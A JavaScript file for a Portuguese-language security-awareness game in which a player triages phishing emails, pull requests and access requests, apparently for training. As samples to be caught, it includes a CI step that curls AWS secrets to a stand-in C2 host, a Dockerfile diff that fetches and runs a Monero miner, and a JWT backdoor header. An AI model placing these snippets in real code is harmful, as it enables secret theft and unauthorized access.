/**
 * TechCore: Cyber SOC & IT Analyst Simulator
 * Game Logic & Scenario Engine
 */

// Sound Synthesizer via Web Audio API
class SoundEngine {
  constructor() {
    this.ctx = null;
    this.enabled = true;
  }

  init() {
    if (!this.ctx) {
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      if (AudioContext) {
        this.ctx = new AudioContext();
      }
    }
  }

  playTone(freq, type = 'sine', duration = 0.1, gainVal = 0.1) {
    if (!this.enabled) return;
    this.init();
    if (!this.ctx) return;

    try {
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
      gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + duration);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + duration);
    } catch (e) {
      console.warn('Audio play error:', e);
    }
  }

  click() {
    this.playTone(800, 'triangle', 0.05, 0.05);
  }

  alert() {
    this.playTone(440, 'sawtooth', 0.15, 0.12);
    setTimeout(() => this.playTone(880, 'sawtooth', 0.2, 0.15), 120);
  }

  success() {
    this.playTone(523.25, 'sine', 0.1, 0.1); // C5
    setTimeout(() => this.playTone(659.25, 'sine', 0.1, 0.1), 100); // E5
    setTimeout(() => this.playTone(783.99, 'sine', 0.25, 0.12), 200); // G5
  }

  danger() {
    this.playTone(220, 'sawtooth', 0.2, 0.18);
    setTimeout(() => this.playTone(180, 'sawtooth', 0.35, 0.2), 150);
  }
}

const audio = new SoundEngine();

// Master Scenarios Database
const SCENARIOS = [
  {
    id: 'scn-1',
    channel: 'email',
    time: '09:15',
    title: '[URGENTE] Atualização Obrigatória de Cadastro de Benefícios',
    sender: 'Marcos Silva - Recursos Humanos <marcos.rh@techcore-beneficios.com>',
    meta: {
      'De': 'marcos.rh@techcore-beneficios.com',
      'Para': 'voce@techcore.com',
      'Data/Hora': 'Hoje, 09:12',
      'Assunto': '[URGENTE] Atualização de Benefícios - Prazo 18h',
      'SPF / DKIM': 'SPF: Neutral | DKIM: None'
    },
    body: `
      <p>Prezado(a) colaborador(a),</p>
      <div class="email-quote-box">
        <p>Identificamos uma inconsistência no seu cadastro do plano de saúde corporativo e vale-alimentação. Para evitar a suspensão temporária dos seus benefícios a partir de amanhã, é obrigatório revalidar suas credenciais no novo portal integrado de RH.</p>
        <p><strong>Acesse o link oficial abaixo:</strong><br>
        <code style="color: var(--cyan);">https://portal-colaborador.techcore-beneficios.com/login-sso</code></p>
      </div>
      <p>Atenciosamente,<br><strong>Marcos Silva</strong> - Gerente de RH</p>
    `,
    inspector: {
      type: 'url',
      label: 'Inspeção de Destino de Link & Domínio',
      dest: 'https://portal-colaborador.techcore-beneficios.com/auth/login-sso?redirect=exfil',
      details: '⚠️ Domínio não autorizado detectado. O RH oficial utiliza exclusivamente @techcore-hr.com.'
    },
    actions: [
      {
        id: 'click_link',
        label: '🌐 Acessar Link e Inserir Credenciais',
        type: 'danger',
        correct: false,
        healthDelta: -30,
        repDelta: -20,
        title: '🚨 VAZAMENTO DE CREDENCIAIS CORPORATIVAS!',
        consequence: 'Você inseriu suas credenciais corporativas em um portal falso de phishing.',
        explanation: 'O domínio do remetente era "@techcore-beneficios.com", que não consta na Guia de Referência. O único domínio autorizado para comunicados do RH é "@techcore-hr.com". Suas credenciais foram capturadas pelos invasores.'
      },
      {
        id: 'report_phishing',
        label: '🛡️ Reportar Phishing & Notificar SecOps',
        type: 'success',
        correct: true,
        healthDelta: 0,
        repDelta: +15,
        title: '✅ PHISHING BLOQUEADO COM SUCESSO!',
        consequence: 'Gateway de e-mail atualizado. O domínio falso foi bloqueado para toda a empresa.',
        explanation: 'Excelente observação! Você checou a Guia e identificou que o domínio "@techcore-beneficios.com" é uma falsificação (typosquatting) do RH oficial (@techcore-hr.com).'
      },
      {
        id: 'delete_email',
        label: '🗑️ Deletar E-mail sem Reportar',
        type: 'secondary',
        correct: false,
        healthDelta: -10,
        repDelta: -5,
        title: '⚠️ AMEAÇA NÃO NOTIFICADA',
        consequence: 'Você se protegeu individualmente, mas outros colaboradores receberam o golpe e clicaram.',
        explanation: 'Embora você não tenha caído no golpe, a política de segurança da TechCore exige o reporte imediato ao gateway para blindar os demais colaboradores.'
      }
    ]
  },
  {
    id: 'scn-2',
    channel: 'github',
    time: '10:05',
    title: 'PR #142: Otimização de queries no endpoint de checkout PIX',
    sender: 'carlos.dev (Sênior Backend)',
    meta: {
      'Repositório': '@TechCore-Official / core-api-v2',
      'Autor': 'carlos.dev (Membro Oficial)',
      'Branch Origem': 'feature/pix-perf-opt',
      'Branch Destino': 'main'
    },
    body: `
      <p><strong>Descrição do Pull Request:</strong></p>
      <div class="email-quote-box">
        <p>Refatoração de índices e paginação na consulta de extratos de pagamentos PIX para reduzir latência de 850ms para 42ms no pico.</p>
        <p>CI Tests: <strong>Passed (184/184 unit tests)</strong></p>
      </div>
    `,
    inspector: {
      type: 'diff',
      label: 'Git Diff Viewer (core-api-v2/src/payments/pix.ts)',
      diff: [
        { type: 'info', text: '@@ -45,6 +45,7 @@ export async function queryPixOrders(userId: string) {' },
        { type: 'removed', text: '-  const orders = await db.query(`SELECT * FROM orders WHERE user = ?`, [userId]);' },
        { type: 'added', text: '+  const orders = await db.query(`SELECT id, status, amount, created_at FROM orders USE INDEX (idx_user_created) WHERE user = ? ORDER BY created_at DESC LIMIT 50`, [userId]);' },
        { type: 'info', text: '@@ -58,4 +59,4 @@' }
      ]
    },
    actions: [
      {
        id: 'approve_pr',
        label: '✅ Aprovar e Fazer Merge no Main',
        type: 'success',
        correct: true,
        healthDelta: 0,
        repDelta: +15,
        title: '🚀 DEPLOY CONCLUÍDO COM SUCESSO!',
        consequence: 'O PR legítimo do desenvolvedor sênior carlos.dev foi integrado perfeitamente.',
        explanation: 'Repositório oficial (core-api-v2), autor autorizado (carlos.dev), branch válida e diff limpo sem código malicioso.'
      },
      {
        id: 'reject_pr',
        label: '❌ Rejeitar e Bloquear Desenvolvedor',
        type: 'danger',
        correct: false,
        healthDelta: 0,
        repDelta: -15,
        title: '⚠️ FALSO POSITIVO - ATRASO NA OPERAÇÃO',
        consequence: 'A equipe de engenharia teve o release de pagamentos bloqueado sem motivo.',
        explanation: 'carlos.dev é um desenvolvedor sênior autorizado e core-api-v2 é o repositório principal de pagamentos da TechCore.'
      }
    ]
  },
  {
    id: 'scn-3',
    channel: 'iam',
    time: '11:20',
    title: 'Solicitação de Elevação de Privilégio: ClusterAdmin (Prod)',
    sender: 'alex.intern (Novo Contratado)',
    meta: {
      'Solicitante': 'alex.intern',
      'Função Solicitada': 'AWS-AdministratorAccess + Kubernetes ClusterAdmin',
      'Ambiente': 'PRODUÇÃO',
      'Chamado de Suporte': 'Nenhum informado'
    },
    body: `
      <p><strong>Justificativa do Solicitante:</strong></p>
      <div class="email-quote-box">
        <p>"Oi time, entrei hoje no time de front-end e preciso de acesso root na AWS e no cluster de produção para debugar um CSS que não está renderizando direito no site."</p>
      </div>
    `,
    inspector: {
      type: 'url',
      label: 'Auditoria de Política IAM (TechAccess)',
      dest: 'Regra de Menor Privilégio & Matriz RBAC TechCore',
      details: '⚠️ Solicitante desconhecido sem chamado prévio registrado por beatriz.sec ou gerência.'
    },
    actions: [
      {
        id: 'approve_iam',
        label: '🔓 Aprovar Permissão de Admin',
        type: 'danger',
        correct: false,
        healthDelta: -35,
        repDelta: -25,
        title: '🚨 VIOLAÇÃO CRÍTICA DE MENOR PRIVILÉGIO!',
        consequence: 'Acesso de administrador irrestrito concedido a usuário não verificado em produção.',
        explanation: 'Pela Guia de Segurança, novos usuários exigem chamado prévio validado pela equipe de segurança (beatriz.sec). Além disso, permissão de ClusterAdmin em produção para depurar frontend viola o princípio do menor privilégio.'
      },
      {
        id: 'reject_iam',
        label: '🚫 Rejeitar Solicitação & Exigir Chamado Validado',
        type: 'success',
        correct: true,
        healthDelta: 0,
        repDelta: +15,
        title: '🛡️ ACESSO INDEVIDO BLOQUEADO!',
        consequence: 'Solicitação negada e encaminhada para a trilha correta de auditoria e onboarding.',
        explanation: 'Correto! Acessos administrativos requerem validação formal e perfil compatível. Usuários não autorizados sem chamado devem ser barrados.'
      }
    ]
  },
  {
    id: 'scn-4',
    channel: 'email',
    time: '12:00',
    title: 'Comunicado Oficial: Escala de Plantão de Fim de Ano e Ponto Eletrônico',
    sender: 'RH TechCore <comunicados@techcore-hr.com>',
    meta: {
      'De': 'comunicados@techcore-hr.com',
      'Para': 'todos@techcore.com',
      'Data/Hora': 'Hoje, 11:58',
      'Assunto': 'Comunicado: Escala de Plantão e Feriados',
      'SPF / DKIM': 'SPF: PASS | DKIM: PASS (techcore-hr.com)'
    },
    body: `
      <p>Prezada equipe,</p>
      <div class="email-quote-box">
        <p>Informamos que o fechamento da folha e a escala de plantões para o próximo mês já estão disponíveis na intranet corporativa habitual. Dúvidas podem ser encaminhadas diretamente ao seu gestor imediato.</p>
        <p>Não é necessária nenhuma ação de revalidação de senha.</p>
      </div>
      <p>Cordialmente,<br><strong>Marcos Silva</strong> - Gerência de Recursos Humanos</p>
    `,
    inspector: {
      type: 'url',
      label: 'Inspeção de Cabeçalho & Assinatura Digital',
      dest: 'Domínio de Origem: techcore-hr.com (Válido e Assinado)',
      details: '✅ Domínio autorizado do RH com SPF e DKIM válidos. Mensagem puramente informativa sem links externos suspeitos.'
    },
    actions: [
      {
        id: 'mark_legit',
        label: '📨 Manter na Caixa de Entrada / Arquivar',
        type: 'success',
        correct: true,
        healthDelta: 0,
        repDelta: +10,
        title: '✅ E-MAIL LEGÍTIMO PROCESSADO',
        consequence: 'Comunicação interna mantida sem interrupções desnecessárias.',
        explanation: 'O e-mail partiu do domínio oficial autorizado para o RH (@techcore-hr.com), assinado com SPF/DKIM e sem armadilhas de engenharia social.'
      },
      {
        id: 'block_rh_email',
        label: '🚨 Bloquear Domínio e Reportar como Phishing',
        type: 'danger',
        correct: false,
        healthDelta: 0,
        repDelta: -20,
        title: '⚠️ FALSO POSITIVO - RH BLOQUEADO!',
        consequence: 'Você bloqueou o canal oficial de comunicados da empresa no firewall de e-mail.',
        explanation: 'O domínio @techcore-hr.com consta expressamente na Guia como o domínio oficial e exclusivo para comunicados de RH.'
      }
    ]
  },
  {
    id: 'scn-5',
    channel: 'github',
    time: '13:40',
    title: 'PR #1: Adicionar script de rotina em lote para relatórios',
    sender: 'shadow.dev',
    meta: {
      'Repositório': '@TechCore-Official / crypto-worker-node',
      'Autor': 'shadow.dev (Usuário Externo)',
      'Branch Origem': 'patch-1',
      'Branch Destino': 'main'
    },
    body: `
      <p><strong>Descrição do Pull Request:</strong></p>
      <div class="email-quote-box">
        <p>"Adicionando worker leve em background para processamento de relatórios analíticos noturnos."</p>
      </div>
    `,
    inspector: {
      type: 'diff',
      label: 'Git Diff Viewer (crypto-worker-node/Dockerfile)',
      diff: [
        { type: 'info', text: '@@ -1,3 +1,8 @@' },
        { type: 'added', text: '+ FROM alpine:latest' },
        { type: 'added', text: '+ RUN wget https://pool.mine-xmr.org/xmrig.tar.gz && tar -xf xmrig.tar.gz' },
        { type: 'added', text: '+ ENTRYPOINT ["./xmrig", "-o", "stratum+tcp://pool.mine-xmr.org:3333", "-u", "WALLET_EXFIL"]' },
        { type: 'info', text: '@@ -5,2 +10,1 @@' }
      ]
    },
    actions: [
      {
        id: 'approve_miner',
        label: '✅ Aprovar Pull Request',
        type: 'danger',
        correct: false,
        healthDelta: -40,
        repDelta: -30,
        title: '🚨 CRYTOMINER INJETADO NA INFRAESTRUTURA!',
        consequence: 'Um minerador de criptomoedas oculto foi implantado nos servidores da empresa.',
        explanation: 'O repositório "crypto-worker-node" não é um repositório oficial (apenas core-api-v2, auth-service e deploy-pipeline são válidos) e o diff continha claramente o executável xmrig.'
      },
      {
        id: 'block_shadow_repo',
        label: '🚫 Fechar PR, Deletar Repositório e Banir Autor',
        type: 'success',
        correct: true,
        healthDelta: 0,
        repDelta: +20,
        title: '🛡️ MALWARE NEUTRALIZADO!',
        consequence: 'Repositório não autorizado eliminado e minerador de Monero bloqueado antes do deploy.',
        explanation: 'Excelente! Você identificou tanto o repositório falso quanto o payload malicioso no Dockerfile.'
      }
    ]
  },
  {
    id: 'scn-6',
    channel: 'email',
    time: '14:30',
    title: '[ALERTA DE SEGURANÇA] Falha no Token 2FA - Redefinição Obrigatória',
    sender: 'Suporte de TI <admin@tech-core.com>',
    meta: {
      'De': 'admin@tech-core.com',
      'Para': 'voce@techcore.com',
      'Data/Hora': 'Hoje, 14:28',
      'Assunto': '[ALERTA] Redefinição Obrigatória de Senha e 2FA',
      'SPF / DKIM': 'SPF: Fail | Domínio Registrado há 2 dias'
    },
    body: `
      <p>Atenção Colaborador,</p>
      <div class="email-quote-box">
        <p>Detectamos tentativas não autorizadas de login na sua conta. Seu token de autenticação de dois fatores (2FA) foi invalidado por precaução.</p>
        <p><strong>Clique imediatamente no link abaixo para sincronizar seu novo token:</strong><br>
        <code style="color: var(--amber);">https://sso-auth.tech-core.com/sync-mfa</code></p>
      </div>
      <p>Helpdesk Central de TI</p>
    `,
    inspector: {
      type: 'url',
      label: 'Inspeção de Domínio (Typosquatting)',
      dest: 'https://sso-auth.tech-core.com/sync-mfa (IP: 185.220.101.5)',
      details: '🚨 Domínio falso: "tech-core.com" possui hífen! O domínio oficial de colaboradores é "@techcore.com".'
    },
    actions: [
      {
        id: 'click_mfa_phish',
        label: '🔑 Clicar no Link e Reconfigurar 2FA',
        type: 'danger',
        correct: false,
        healthDelta: -35,
        repDelta: -25,
        title: '🚨 INVASÃO DE CONTA COM BYPASS DE 2FA!',
        consequence: 'Os invasores roubaram seu token OTP e ganharam acesso à sua sessão corporativa.',
        explanation: 'Atenção redobrada: o remetente usou "@tech-core.com" (com hífen), uma técnica clássica de typosquatting destacada na Guia de Referência.'
      },
      {
        id: 'report_typosquatting',
        label: '🛡️ Reportar Phishing / Typosquatting ao SOC',
        type: 'success',
        correct: true,
        healthDelta: 0,
        repDelta: +15,
        title: '✅ TYPOSQUATTING IDENTIFICADO E BLOQUEADO!',
        consequence: 'Domínio malicioso com hífen bloqueado no DNS corporativo.',
        explanation: 'Muito bem! Você notou a variação sutil com hífen que tentava simular a equipe de TI da TechCore.'
      }
    ]
  },
  {
    id: 'scn-7',
    channel: 'github',
    time: '15:15',
    title: 'PR #89: Correção de validação de claims JWT em ambiente de teste',
    sender: 'unknown.coder',
    meta: {
      'Repositório': '@TechCore-Official / auth-service',
      'Autor': 'unknown.coder (Sem vínculo verificado)',
      'Branch Origem': 'jwt-fix-patch',
      'Branch Destino': 'main'
    },
    body: `
      <p><strong>Descrição do Pull Request:</strong></p>
      <div class="email-quote-box">
        <p>"Ajuste rápido no middleware de autenticação para evitar erros 401 durante testes de integração."</p>
      </div>
    `,
    inspector: {
      type: 'diff',
      label: 'Git Diff Viewer (auth-service/src/middleware/jwt.ts)',
      diff: [
        { type: 'info', text: '@@ -22,6 +22,9 @@ export function verifyToken(req, res, next) {' },
        { type: 'added', text: '+  if (req.headers["x-bypass-sec"] === "ROOT_OVERRIDE_SECRET") {' },
        { type: 'added', text: '+    req.user = { id: 0, role: "SUPERADMIN", permissions: ["*"] }; return next();' },
        { type: 'added', text: '+  }' },
        { type: 'info', text: '@@ -28,4 +31,4 @@' }
      ]
    },
    actions: [
      {
        id: 'approve_jwt_backdoor',
        label: '✅ Aprovar PR no auth-service',
        type: 'danger',
        correct: false,
        healthDelta: -45,
        repDelta: -30,
        title: '🚨 BACKDOOR CRÍTICO NO SISTEMA DE AUTENTICAÇÃO!',
        consequence: 'Qualquer invasor na internet que envie o header especial agora vira Superadmin.',
        explanation: 'O PR introduziu um backdoor explícito que burla a validação JWT, além de ter sido enviado por um usuário desconhecido sem autorização da equipe (beatriz.sec).'
      },
      {
        id: 'reject_jwt_backdoor',
        label: '🚫 Rejeitar PR & Alertar beatriz.sec (SecOps)',
        type: 'success',
        correct: true,
        healthDelta: 0,
        repDelta: +20,
        title: '🛡️ TENTATIVA DE BACKDOOR FRUSTRADA!',
        consequence: 'Código malicioso rejeitado e IP do remetente colocado na lista de contenção do WAF.',
        explanation: 'Excelente inspeção no diff! Você pegou o bypass de autorização antes que chegasse à branch main.'
      }
    ]
  },
  {
    id: 'scn-8',
    channel: 'iam',
    time: '16:00',
    title: 'Acesso Temporário de Auditoria CloudTrail: Investigação de Incidente',
    sender: 'beatriz.sec (SecOps / Segurança)',
    meta: {
      'Solicitante': 'beatriz.sec',
      'Função Solicitada': 'AWS-ReadOnly-SecurityAudit (Expiração: 4 horas)',
      'Ambiente': 'PRODUÇÃO / LOGS',
      'Chamado de Suporte': 'Chamado #SEC-8921 (Aprovado pelo CISO)'
    },
    body: `
      <p><strong>Justificativa do Solicitante:</strong></p>
      <div class="email-quote-box">
        <p>"Investigação urgente de tentativa de brute-force originada de IPs estrangeiros na API de pagamentos. Preciso de permissão de leitura nos logs do CloudTrail para análise forense."</p>
      </div>
    `,
    inspector: {
      type: 'url',
      label: 'Auditoria de Conformidade IAM',
      dest: 'Chamado #SEC-8921 // Beatriz SecOps',
      details: '✅ Usuária autorizada conhecida (beatriz.sec), escopo somente leitura de auditoria e chamado formal anexado.'
    },
    actions: [
      {
        id: 'approve_sec_audit',
        label: '🔓 Aprovar Concessão Temporária (4h)',
        type: 'success',
        correct: true,
        healthDelta: 0,
        repDelta: +15,
        title: '✅ ACESSO DE SEGURANÇA LIBERADO',
        consequence: 'A equipe de SecOps pôde investigar a tempo e conter a tentativa de invasão externa.',
        explanation: 'beatriz.sec é a analista de segurança autorizada pela Guia de Referência e o pedido seguiu todas as normas (somente leitura, temporário com chamado).'
      },
      {
        id: 'deny_sec_audit',
        label: '🚫 Rejeitar Solicitação de beatriz.sec',
        type: 'danger',
        correct: false,
        healthDelta: -20,
        repDelta: -15,
        title: '⚠️ INVESTIGAÇÃO DE SEGURANÇA BLOQUEADA!',
        consequence: 'O time de SecOps ficou cego durante o ataque e a empresa sofreu indisponibilidade.',
        explanation: 'beatriz.sec é a responsável oficial por SecOps na TechCore. Rejeitar pedidos legítimos com chamado atrasa a defesa cibernética.'
      }
    ]
  },
  {
    id: 'scn-9',
    channel: 'github',
    time: '16:50',
    title: 'PR #55: ci: Adicionar notificação no Discord/Slack após build',
    sender: 'carlos-dev-patch-1 (Fork Externo)',
    meta: {
      'Repositório': '@TechCore-Official / deploy-pipeline',
      'Autor': 'carlos-dev-patch-1 (Fork Suspeito)',
      'Branch Origem': 'carlos-dev-patch-1:feature/webhook',
      'Branch Destino': 'main'
    },
    body: `
      <p><strong>Descrição do Pull Request:</strong></p>
      <div class="email-quote-box">
        <p>"Integração com webhook para avisar o canal de deploys quando a build finalizar."</p>
      </div>
    `,
    inspector: {
      type: 'diff',
      label: 'Git Diff Viewer (.github/workflows/deploy.yml)',
      diff: [
        { type: 'info', text: '@@ -18,4 +18,6 @@ jobs:' },
        { type: 'added', text: '+    - name: Webhook Notify' },
        { type: 'added', text: '+      run: |' },
        { type: 'added', text: '+        curl -s -X POST https://exfil-logs.dark-c2.net/payload -d "SECRET=$AWS_SECRET_ACCESS_KEY&DB=$PROD_DB_PASSWORD"' },
        { type: 'info', text: '@@ -24,3 +26,1 @@' }
      ]
    },
    actions: [
      {
        id: 'approve_supply_chain',
        label: '✅ Aprovar Pipeline CI/CD',
        type: 'danger',
        correct: false,
        healthDelta: -50,
        repDelta: -30,
        title: '🚨 EXFILTRAÇÃO TOTAL DE SECRETS DA TECHCORE!',
        consequence: 'Todas as chaves AWS e senhas de banco de dados de produção foram enviadas para o servidor do hacker.',
        explanation: 'Ataque de Supply Chain CI/CD clássico. A conta era um fork disfarçado e o script do GitHub Actions exfiltrava variáveis de ambiente secretas.'
      },
      {
        id: 'reject_supply_chain',
        label: '🚫 Rejeitar PR, Revogar Chaves e Bloquear Fork',
        type: 'success',
        correct: true,
        healthDelta: 0,
        repDelta: +25,
        title: '🛡️ SUPPLY CHAIN ATTACK EVITADO!',
        consequence: 'Injeção de script no CI/CD interceptada. Segredos de produção continuam seguros.',
        explanation: 'Excelente! Você inspecionou o workflow do deploy-pipeline e identificou o comando curl enviando variáveis confidenciais.'
      }
    ]
  },
  {
    id: 'scn-10',
    channel: 'email',
    time: '17:35',
    title: '[CONFIDENCIAL/DIRETORIA] Liberação Emergencial de Chave SSH no Gateway',
    sender: 'Diretoria Executiva <ceo-office@techcore-corp-board.com>',
    meta: {
      'De': 'ceo-office@techcore-corp-board.com',
      'Para': 'voce@techcore.com',
      'Data/Hora': 'Hoje, 17:33',
      'Assunto': '[CONFIDENCIAL] Inserção de Chave SSH Sem Chamado',
      'SPF / DKIM': 'SPF: Fail | Domínio Externo'
    },
    body: `
      <p>Prezado(a) Analista,</p>
      <div class="email-quote-box">
        <p>Estou em trânsito e fechando uma auditoria com investidores externos. Preciso que você adicione a chave pública abaixo no arquivo <code>authorized_keys</code> do servidor de produção imediatamente:</p>
        <p><code style="font-size: 10px; word-break: break-all; color: var(--amber);">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8x... root@shadow-proxy</code></p>
        <p>Não abra chamado nem comente com a equipe para não vazar a operação confidencial.</p>
      </div>
      <p>Gabinete da Presidência</p>
    `,
    inspector: {
      type: 'url',
      label: 'Inspeção de Spear Phishing (Engenharia Social / Fraude do CEO)',
      dest: 'Remetente: @techcore-corp-board.com (Falso!)',
      details: '🚨 Tentativa clássica de Fraude do CEO / Spear Phishing. O domínio oficial de colaboradores da empresa é apenas @techcore.com.'
    },
    actions: [
      {
        id: 'add_ssh_key',
        label: '🔑 Adicionar Chave SSH no Servidor',
        type: 'danger',
        correct: false,
        healthDelta: -50,
        repDelta: -40,
        title: '🚨 INVASÃO DIRETA VIA SSH ROOT!',
        consequence: 'O atacante obteve persistência root no servidor principal sem qualquer controle.',
        explanation: 'Golpe clássico de Fraude do CEO com sentimento de urgência e sigilo para forçar violação de procedimentos de segurança.'
      },
      {
        id: 'report_ceo_fraud',
        label: '🛡️ Bloquear E-mail & Reportar Incidente de Spear Phishing',
        type: 'success',
        correct: true,
        healthDelta: 0,
        repDelta: +20,
        title: '🏆 FRAUDE DO CEO NEUTRALIZADA!',
        consequence: 'Tentativa de engenharia social bloqueada e registrada no relatório forense.',
        explanation: 'Perfeito! Você manteve a postura profissional, reconheceu o domínio falso e não violou a política de segurança sob pressão hierárquica simulada.'
      }
    ]
  }
];

// Game State Controller
class TechCoreGame {
  constructor() {
    this.currentIndex = 0;
    this.health = 100;
    this.reputation = 100;
    this.threatsBlocked = 0;
    this.currentChannelFilter = 'all';
    this.decisionsHistory = [];
    this.gameStarted = false;

    this.cacheDOMElements();
    this.bindEvents();
    this.updateDashboard();
  }

  cacheDOMElements() {
    this.clockEl = document.getElementById('clock-display');
    this.healthBarEl = document.getElementById('health-bar');
    this.healthTextEl = document.getElementById('health-text');
    this.repTextEl = document.getElementById('reputation-text');
    this.threatsBlockedEl = document.getElementById('threats-blocked');

    this.badgeAllEl = document.getElementById('badge-all');
    this.badgeEmailEl = document.getElementById('badge-email');
    this.badgeGithubEl = document.getElementById('badge-github');
    this.badgeIamEl = document.getElementById('badge-iam');

    this.taskListContainer = document.getElementById('task-list-container');
    this.feedProgressLabel = document.getElementById('feed-progress-label');

    this.welcomeScreen = document.getElementById('welcome-screen');
    this.activeTaskScreen = document.getElementById('active-task-screen');
    this.gameOverScreen = document.getElementById('game-over-screen');

    this.taskHeaderView = document.getElementById('task-header-view');
    this.taskBodyView = document.getElementById('task-body-view');
    this.inspectorView = document.getElementById('inspector-view');
    this.taskActionsView = document.getElementById('task-actions-view');

    this.outcomeModal = document.getElementById('outcome-modal');
    this.outcomeIcon = document.getElementById('outcome-icon');
    this.outcomeTitle = document.getElementById('outcome-title');
    this.outcomeConsequence = document.getElementById('outcome-consequence');
    this.outcomeExplanation = document.getElementById('outcome-explanation');
    this.outcomeNextBtn = document.getElementById('outcome-next-btn');

    this.guideModal = document.getElementById('guide-modal');
  }

  bindEvents() {
    // Start Game
    document.getElementById('btn-start-game').addEventListener('click', () => {
      audio.click();
      this.startGame();
    });

    // Sound toggle
    const soundBtn = document.getElementById('sound-toggle-btn');
    soundBtn.addEventListener('click', () => {
      audio.enabled = !audio.enabled;
      soundBtn.textContent = audio.enabled ? '🔊' : '🔇';
      if (audio.enabled) audio.click();
    });

    // Guide toggle modal
    document.getElementById('ref-guide-btn').addEventListener('click', () => {
      audio.click();
      this.guideModal.style.display = 'flex';
    });
    document.getElementById('close-guide-btn').addEventListener('click', () => {
      audio.click();
      this.guideModal.style.display = 'none';
    });

    // Navigation Tabs
    document.querySelectorAll('.soc-sidebar .nav-tab[data-channel]').forEach(tab => {
      tab.addEventListener('click', (e) => {
        audio.click();
        document.querySelectorAll('.soc-sidebar .nav-tab[data-channel]').forEach(t => t.classList.remove('active'));
        const target = e.currentTarget;
        target.classList.add('active');
        this.currentChannelFilter = target.getAttribute('data-channel');
        this.renderTaskList();
      });
    });

    // Next button in outcome modal
    this.outcomeNextBtn.addEventListener('click', () => {
      audio.click();
      this.outcomeModal.style.display = 'none';
      this.advanceToNextTask();
    });

    // Restart game
    document.getElementById('btn-restart-game').addEventListener('click', () => {
      audio.click();
      this.resetGame();
    });
  }

  startGame() {
    this.gameStarted = true;
    this.currentIndex = 0;
    this.health = 100;
    this.reputation = 100;
    this.threatsBlocked = 0;
    this.decisionsHistory = [];

    this.welcomeScreen.style.display = 'none';
    this.gameOverScreen.style.display = 'none';
    this.activeTaskScreen.style.display = 'flex';

    this.updateDashboard();
    this.renderTaskList();
    this.loadTask(this.currentIndex);
  }

  resetGame() {
    this.startGame();
  }

  updateDashboard() {
    const currentTask = SCENARIOS[this.currentIndex] || SCENARIOS[SCENARIOS.length - 1];
    if (this.clockEl) this.clockEl.textContent = currentTask.time || '18:00';

    if (this.healthBarEl && this.healthTextEl) {
      const safeHealth = Math.max(0, Math.min(100, this.health));
      this.healthBarEl.style.width = `${safeHealth}%`;
      this.healthTextEl.textContent = `${safeHealth}%`;
      
      if (safeHealth < 40) {
        this.healthTextEl.className = 'stat-value text-danger';
      } else if (safeHealth < 70) {
        this.healthTextEl.className = 'stat-value text-amber';
      } else {
        this.healthTextEl.className = 'stat-value text-emerald';
      }
    }

    if (this.repTextEl) {
      this.repTextEl.textContent = `${this.reputation} pts`;
      this.repTextEl.className = this.reputation < 50 ? 'stat-value text-danger' : 'stat-value text-emerald';
    }

    if (this.threatsBlockedEl) {
      this.threatsBlockedEl.textContent = this.threatsBlocked;
    }

    // Update channel count badges
    const remaining = SCENARIOS.slice(this.currentIndex);
    if (this.badgeAllEl) this.badgeAllEl.textContent = remaining.length;
    if (this.badgeEmailEl) this.badgeEmailEl.textContent = remaining.filter(s => s.channel === 'email').length;
    if (this.badgeGithubEl) this.badgeGithubEl.textContent = remaining.filter(s => s.channel === 'github').length;
    if (this.badgeIamEl) this.badgeIamEl.textContent = remaining.filter(s => s.channel === 'iam').length;

    if (this.feedProgressLabel) {
      this.feedProgressLabel.textContent = `Item ${Math.min(this.currentIndex + 1, SCENARIOS.length)} de ${SCENARIOS.length}`;
    }
  }

  renderTaskList() {
    if (!this.taskListContainer) return;
    this.taskListContainer.innerHTML = '';

    SCENARIOS.forEach((scenario, index) => {
      // Filter logic
      if (this.currentChannelFilter !== 'all' && scenario.channel !== this.currentChannelFilter) {
        return;
      }

      const isCompleted = index < this.currentIndex;
      const isActive = index === this.currentIndex;

      const card = document.createElement('div');
      card.className = `task-item-card ${isActive ? 'active' : ''} ${isCompleted ? 'completed' : ''}`;
      
      let tagClass = 'tag-email';
      let tagLabel = 'TechMail';
      if (scenario.channel === 'github') {
        tagClass = 'tag-github';
        tagLabel = 'TechHub';
      } else if (scenario.channel === 'iam') {
        tagClass = 'tag-iam';
        tagLabel = 'TechAccess';
      }

      card.innerHTML = `
        <div class="item-meta">
          <span class="item-tag ${tagClass}">${tagLabel}</span>
          <span class="item-time">${scenario.time}</span>
        </div>
        <div class="item-title">${scenario.title}</div>
        <div class="item-sender">${scenario.sender}</div>
      `;

      card.addEventListener('click', () => {
        if (!isCompleted) {
          audio.click();
          this.currentIndex = index;
          this.loadTask(this.currentIndex);
          this.renderTaskList();
        }
      });

      this.taskListContainer.appendChild(card);
    });
  }

  loadTask(index) {
    if (index >= SCENARIOS.length) {
      this.finishGame();
      return;
    }

    const task = SCENARIOS[index];
    this.updateDashboard();

    // Render Header
    let tagBadge = task.channel === 'email' ? '📨 E-MAIL CORPORATIVO' : (task.channel === 'github' ? '🐙 PULL REQUEST GITHUB' : '🔐 AUDITORIA DE ACESSO IAM');
    let metaFieldsHtml = Object.entries(task.meta).map(([key, val]) => `
      <div class="meta-field">
        <strong>${key}:</strong> <span>${val}</span>
      </div>
    `).join('');

    this.taskHeaderView.innerHTML = `
      <div class="item-header-top">
        <span class="review-badge">${tagBadge}</span>
        <span class="item-time" style="font-size: 12px; color: var(--cyan);">${task.time}</span>
      </div>
      <h2>${task.title}</h2>
      <div class="header-metadata-grid">
        ${metaFieldsHtml}
      </div>
    `;

    // Render Body
    this.taskBodyView.innerHTML = task.body;

    // Render Inspector
    if (task.inspector.type === 'diff') {
      let diffLinesHtml = task.inspector.diff.map(line => {
        let cls = 'diff-info';
        if (line.type === 'added') cls = 'diff-added';
        if (line.type === 'removed') cls = 'diff-removed';
        return `<span class="${cls}">${this.escapeHtml(line.text)}</span>`;
      }).join('\n');

      this.inspectorView.innerHTML = `
        <div class="inspector-title">🔍 ${task.inspector.label}</div>
        <pre class="diff-view"><code>${diffLinesHtml}</code></pre>
      `;
    } else {
      this.inspectorView.innerHTML = `
